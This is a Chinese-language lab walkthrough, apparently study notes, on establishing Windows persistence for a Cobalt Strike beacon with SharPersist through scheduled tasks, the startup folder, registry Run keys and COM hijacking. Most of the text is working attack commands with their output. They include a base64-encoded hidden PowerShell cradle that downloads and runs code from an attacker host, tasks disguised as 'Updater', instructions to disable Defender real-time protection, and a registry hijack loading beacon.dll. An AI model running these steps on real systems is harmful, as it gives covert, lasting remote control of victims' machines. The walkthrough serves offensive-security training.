使用工具[SharPersist.exe](https://github.com/mandiant/SharPersist/releases)

教材上这个实验用到的工具放在：```C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe```

我本地复现这个实验，工具放在kali的```/root/CobaltStrike/tools/```路径，因为我是在kali开启的客户端

# 定时任务

1. 把执行的payload转成base64

windows：
```
PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://192.168.1.5:80/a"))'
PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADUAOgA4ADAALwBhACIAKQApAA==
```
![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658552371913.jpg)

kali:
```
┌──(root㉿kali)-[~]
└─# str='IEX ((new-object net.webclient).downloadstring("http://192.168.1.5:80/a"))'
                                                                                                                                                                                                                                                                      
┌──(root㉿kali)-[~]
└─# echo -en $str | iconv -t UTF-16LE | base64 -w 0
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADUAOgA4ADAALwBhACIAKQApAA==                                                                          
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658552409755.png)


2. 创建定时任务


```
beacon> execute-assembly tools/SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADUAOgA4ADAALwBhACIAKQApAA==" -n "Updater" -m add -o hourly
[*] Tasked beacon to run .NET program: SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADUAOgA4ADAALwBhACIAKQApAA==" -n "Updater" -m add -o hourly
[+] host called home, sent: 342717 bytes
[+] received output:

[*] INFO: Adding scheduled task persistence
[*] INFO: Command: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
[*] INFO: Command Args: -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADUAOgA4ADAALwBhACIAKQApAA==
[*] INFO: Scheduled Task Name: Updater
[*] INFO: Option: hourly


[+] SUCCESS: Scheduled task added

```

参数
```
-t是所需的持久性技术。
-c是要执行的命令。
-a是该命令的任何参数。
-n是任务的名称。
-m是添加任务（也可以remove，check和list）。
-o是任务频率。
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658552739085.png)


在win上,打开```Task Scheduler ```，找到定时任务```Updater```，点击run可以马上执行这个任务

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658553107506.png)

收到beacon
![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658553273601.png)


# 启动文件夹

**注意，复现开机启动的权限维持，需要关闭靶机上的实时防护，否则不会返回beacon**

win+r打开注册表，输入```gpedit.msc```,按图操作，彻底关闭实时防护

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658555294635.png)

创建一个开机启动任务
```
beacon> execute-assembly tools/SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADUAOgA4ADAALwBhACIAKQApAA==" -f "UserEnvSetup" -m add
[*] Tasked beacon to run .NET program: SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADUAOgA4ADAALwBhACIAKQApAA==" -f "UserEnvSetup" -m add
[+] host called home, sent: 342719 bytes
[+] received output:

[*] INFO: Adding startup folder persistence
[*] INFO: Command: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
[*] INFO: Command Args: -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADUAOgA4ADAALwBhACIAKQApAA==
[*] INFO: File Name: UserEnvSetup


[+] SUCCESS: Startup folder persistence created
[*] INFO: LNK File located at: C:\Users\IEUser\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UserEnvSetup.lnk
[*] INFO: SHA256 Hash of LNK file: 4EF72582549967B29F66CF83BFA65F3D36EBFA8D2E0F3AB5CFE9ADFF51DC8011

```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658553789330.png)

此时在```C:\Users\IEUser\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup```路径下会生成一个文件

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658553996815.png)

重启windows主机，拿到baecon

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658554807580.png)


# 注册表自动运行

1. 生成

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658573005655.png)

2. 上传到靶机
```
upload /root/payloads/updater.exe
```

3. 写进注册表自动运行
```
execute-assembly tools/SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658572707486.jpg)

4. 重启靶机验证
![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658573188786.png)


# COM劫持

1. 过滤选项设置
- **RegOpenKey** operations.

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658630696303.jpg)

- where the Result is **NAME NOT FOUND**

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658630832115.png)

- and the Path ends with **InprocServer32**

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658630924161.png)

搜索结果：
![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658632516852.png)

2. 选择```HKLM:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32```

验证只存在于HKLM中，而不存在于HKCU

```
PS C:\>  Get-Item -Path "HKLM:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"


    Hive: HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}


Name                           Property
----                           --------
InprocServer32                 (default)      : C:\Windows\System32\thumbcache.dll
                               ThreadingModel : Apartment


PS C:\> Get-Item -Path "HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32'
because it does not exist.
At line:1 char:1
+ Get-Item -Path "HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (HKCU:\Software\...\InprocServer32:String) [Get-Item], ItemNotFoundExcep
   tion
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetItemCommand
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658632812217.png)


3. 创建一个HKCU，并且指定依赖的DLL文件为我们的payload文件```C:\beacon.dll```

```
PS C:\>  New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"


    Hive: HKEY_CURRENT_USER\Software\Classes\CLSID


Name                           Property
----                           --------
{AB8902B4-09CA-4bb6-B78D-A8F59
079A8D5}


PS C:\> New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"


    Hive: HKEY_CURRENT_USER\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}


Name                           Property
----                           --------
InprocServer32                 (default) : C:\beacon.dll


PS C:\> New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"


ThreadingModel : Both
PSPath         : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-
                 A8F59079A8D5}\InprocServer32
PSParentPath   : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-
                 A8F59079A8D5}
PSChildName    : InprocServer32
PSDrive        : HKCU
PSProvider     : Microsoft.PowerShell.Core\Registry
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658632941438.png)


3. 生成dll payload文件

CS生成payload路径
``` Attacks > Packages > Windows Executable (S)```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658633025442.png)


把生成的DLL文件命名为```beacon.dll```，并且放置到C盘目录下

4. 执行DllHost.exe

什么是DllHost.exe文件？

> dllhost.exe是微软Windows操作系统的一部分。 dllhost.exe用于管理DLL应用，在任务管理器中可以找到，这个程序对是微软Windows系统的正常运行是非常重要的。

>dllhost.exe是运行COM+的组件，即COM代理，运行Windows中的Web和FTP服务器必须有这个东西。什么时候会出现dllhost.exe？运行COM+组件程序的时候就会出现


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658633304308.png)


5. 返回一个beacon

动态链接库```beacon.dll```被执行，返回了一个beacon

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1658633476738.png)